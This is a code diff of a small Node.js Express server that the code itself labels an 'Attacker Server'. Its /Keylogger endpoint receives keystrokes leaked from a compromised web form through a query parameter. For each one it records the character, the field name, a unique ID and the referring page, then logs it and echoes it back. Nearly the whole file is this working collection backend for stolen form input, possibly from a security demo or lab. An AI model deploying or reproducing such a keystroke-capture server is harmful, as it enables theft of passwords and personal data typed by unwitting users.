@@ -1,36 +1,39 @@
-var express = require('express')
-var app = express()
+var express = require( 'express' );
+var app = express();
 
 // Static files
-app.use(express.static('public'))
+app.use( express.static( 'public' ) );
 
-app.get('/', function (req, res) {
-  res.send('Hello World!')
-})
-
-app.listen(8000, function () {
-  console.log('Example app listening on port 8000!')
-})
-
-app.get('/', function(req, res){
-    res.send('Hello');
-})
+app.listen( 8000, function () {
+  console.log( 'Example app listening on port 8000!' );
+} );
 
 
-app.get('/Keylogger', function(req, res){
-    var recievedData = req.query.k;
-console.log("data = ", recievedData);
+
+app.get( '/', function ( req, res ) {
+  res.send( 'Attacker Server is running!' );
+} );
+
+app.get( '/Keylogger', function( req, res ) {
+
+    var kQueryString = req.query.k;
     
-    if(!recievedData || recievedData === null ){ 
-        res.send('didn\'t understand your log');        
-    } else {    
+    if( !kQueryString || kQueryString === null ) { 
         
-        var data = recievedData.split(',');
-        var value = data[0];
-        var field = data[1];
-        var unique = data[2];
+        res.send( 'didn\'t understand your log' );
+        console.log( "invalid or missing 'k' querystring" );
 
+    } else {    
 
-        res.send('Logged request for field ' + field + ', containing a character: ' + value + ' against unique number ' + unique );
+        var recievedData = kQueryString.split( ',' );
+        var data = {
+            referrer: req.get( 'Referer' ) || "not available",
+            fieldModified: recievedData[1],
+            enteredValue: recievedData[0],
+            uniqueRef: recievedData[2]
+        }
+
+        console.log( "Captured k querystring data", JSON.stringify( data, null, 3 ) );
+        res.send( "Recieved following data from compromised form: " + JSON.stringify( data, null, 3 ) );
     }
 })
